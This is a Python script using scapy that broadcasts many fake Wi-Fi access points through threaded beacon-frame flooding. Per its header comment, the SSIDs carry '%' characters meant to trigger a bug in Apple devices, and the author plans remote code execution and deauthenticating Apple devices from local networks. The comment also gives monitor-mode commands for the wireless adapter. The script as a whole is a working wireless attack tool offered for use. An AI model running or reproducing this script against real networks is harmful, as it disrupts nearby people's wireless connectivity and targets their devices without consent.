from scapy.all import *
from scapy.layers import dot11
import os
import random
from threading import Thread

'''
this is a cocept for a bug found on apple products
might try work on remote code excution

this will just make a unch of fake accses points with % sings replaceing the spaces
even in python it would see them as code

for netgear to broadcast it:
    ifconfig IFACE down
    iwconfig IFACE mode monitor
    ifconfig IFACE up

next will get it too look at local wifi another adaptor and kick any apple products off them
'''


def send_beacon(ssid, mac, infinite=True):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    # ESS+privacy to appear as secured on some devices
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/beacon/essid
    sendp(frame, inter=0.1, loop=1, iface=iface, verbose=0)





n = open("ap_new.txt","r").readlines()

con = open("config.txt","r").readlines()

t = con[3]
m = t.split("=")
m = m[1]
m = m.replace("\n","")
mx = int(m)

r = con[5]
ran_ap = r.split("=")
ran_ap = ran_ap[1]
ran_ap = ran_ap.replace("\n","")
ran_ap = int(ran_ap)

if ran_ap == 0:
    names = []
    for c in range(mx):
        names.append(n[c])
elif ran_ap == 1:
    names = []
    li = len(n)
    li = li - 1
    for c in range(mx):
        f = random.randint(0,li)
        names.append(n[f])


ran = con[4]
ran = ran.split("=")
ran = ran[1]
ran = ran.replace("\n","")
ran = int(ran)
if ran == 0:
    m = open("mac_new.txt","r").readlines()

    mc = []
    for c in range(mx):
        mc.append(m[c])
elif ran == 1:
    mc = []
    print("[-] generating mac adresses")
    for m in names:
        mc.append(RandMAC())
else:
    print("[!] config file error")
    print("[!] ran can only be 1  or 0")

i = open("config.txt","r").readlines()[2]
i = i.split("=")
iface = i[1]
iface = iface.replace("\n","")


try:
    print("[-] starting may take several secconds for them to apear")
    try:
        for r in range(len(names)):
            ssid = names[r]
            ssid = ssid.replace("\n","")
            mac = mc[r]
            mac = mac.replace("\n","")
            print("[-] sending ssid ("+str(ssid)+") with mac ("+str(mac)+")")
            Thread(target=send_beacon, args=(ssid, mac)).start()
    except Exception as e:
        print("[!] unhandled error!")
        print("[!] re-running program main")
        print("[ERROR] ", e)
except KeyboardInterrupt:
    print("[!] USER INTERRUPT")
    print("[!] BYE!")
